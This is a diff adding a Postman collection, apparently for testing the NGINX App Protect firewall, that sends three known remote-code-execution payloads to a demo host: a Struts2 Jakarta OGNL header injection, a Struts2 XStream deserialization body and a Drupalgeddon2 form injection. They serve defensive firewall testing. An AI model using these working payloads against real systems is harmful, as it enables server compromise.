@@ -1,0 +1,152 @@
+{
+	"info": {
+		"_postman_id": "4e27aa93-f7e9-4764-a1c8-0d77071ed773",
+		"name": "NGINX App Protect tests",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Apache Struts2 Jakarta Multipart Parser - gift",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Accept-Encoding",
+						"value": "identity"
+					},
+					{
+						"key": "Connection",
+						"value": "close"
+					},
+					{
+						"key": "Content-Type",
+						"value": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#gift='jexboss').(#isnix=(@java.lang.System@getProperty('file.separator').equals(\"/\"))).(#giftarray=(#isnix?{'/bin/bash','-c',#gift}:{'cmd.exe','/c',#gift})).(#p=new java.lang.ProcessBuilder(#giftarray)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+					},
+					{
+						"key": "User-Agent",
+						"value": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
+					}
+				],
+				"url": {
+					"raw": "http://protected.f5demo.com/path",
+					"protocol": "http",
+					"host": [
+						"protected",
+						"f5demo",
+						"com"
+					],
+					"path": [
+						"path"
+					]
+				},
+				"description": "Apache Struts2 Jakarta Multipart Parser - gift"
+			},
+			"response": []
+		},
+		{
+			"name": "Apache Struts2 REST Plugin XStream RCE - Go-http-client / Apache Struts2 REST Plugin XStream RCE - metasploit",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "                <map>\r\n                <entry>\r\n                <jdk.nashorn.internal.objects.NativeString>\r\n                <flags>0</flags>\r\n                <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\r\n                <dataHandler>\r\n                <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\r\n                <is class=\"javax.crypto.CipherInputStream\">\r\n                <cipher class=\"javax.crypto.NullCipher\">\r\n                <initialized>false</initialized>\r\n                <opmode>0</opmode>\r\n                <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\r\n                <iter class=\"javax.imageio.spi.FilterIterator\">\r\n                <iter class=\"java.util.Collections$EmptyIterator\"/>\r\n                <next class=\"java.lang.ProcessBuilder\">\r\n                <command>\r\n                <string>/bin/sh</string><string>-c</string><string>15</string>\r\n                </command>\r\n                <redirectErrorStream>false</redirectErrorStream>\r\n                </next>\r\n                </iter>\r\n                <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\r\n                <method>\r\n                <class>java.lang.ProcessBuilder</class>\r\n                <name>start</name>\r\n                <parameter-types/>\r\n                </method>\r\n                <name>foo</name>\r\n                </filter>\r\n                <next class=\"string\">foo</next>\r\n                </serviceIterator>\r\n                <lock/>\r\n                </cipher>\r\n                <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\r\n                <ibuffer/>\r\n                <done>false</done>\r\n                <ostart>0</ostart>\r\n                <ofinish>0</ofinish>\r\n                <closed>false</closed>\r\n                </is>\r\n                <consumed>false</consumed>\r\n                </dataSource>\r\n                <transferFlavors/>\r\n                </dataHandler>\r\n                <dataLen>0</dataLen>\r\n                </value>\r\n                </jdk.nashorn.internal.objects.NativeString>\r\n                <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\r\n                </entry>\r\n                <entry>\r\n                <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\r\n                <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\r\n                </entry>\r\n                </map>"
+				},
+				"url": {
+					"raw": "http://protected.f5demo.com/index.php",
+					"protocol": "http",
+					"host": [
+						"protected",
+						"f5demo",
+						"com"
+					],
+					"path": [
+						"index.php"
+					]
+				},
+				"description": "Apache Struts2 REST Plugin XStream RCE - Go-http-client / Apache Struts2 REST Plugin XStream RCE - metasploit"
+			},
+			"response": []
+		},
+		{
+			"name": "Drupal 'Drupalgeddon2' RCE - Muhstik",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Cache-Control",
+						"value": "no-cache"
+					},
+					{
+						"key": "Connection",
+						"value": "keep-alive"
+					},
+					{
+						"key": "User-Agent",
+						"value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+					},
+					{
+						"key": "Content-Type",
+						"value": "application/x-www-form-urlencoded"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "form_id=user_register_form&_drupal_ajax=1&mail[#post_render[]=exec&mail[#type]=markup&mail[#markup]=echo \"team6 representing 73de29021fd0d8d2cfd204d2d955a46d\"|tee t6nv"
+				},
+				"url": {
+					"raw": "http://protected.f5demo.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
+					"protocol": "http",
+					"host": [
+						"protected",
+						"f5demo",
+						"com"
+					],
+					"path": [
+						"user",
+						"register"
+					],
+					"query": [
+						{
+							"key": "element_parents",
+							"value": "account/mail/%23value"
+						},
+						{
+							"key": "ajax_form",
+							"value": "1"
+						},
+						{
+							"key": "_wrapper_format",
+							"value": "drupal_ajax"
+						}
+					]
+				},
+				"description": "Drupal 'Drupalgeddon2' RCE - Muhstik"
+			},
+			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"id": "03673299-621c-4de5-94ec-ae95528d39f9",
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"id": "29d64739-09e6-4f9a-909d-153567b23214",
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"protocolProfileBehavior": {}
+}
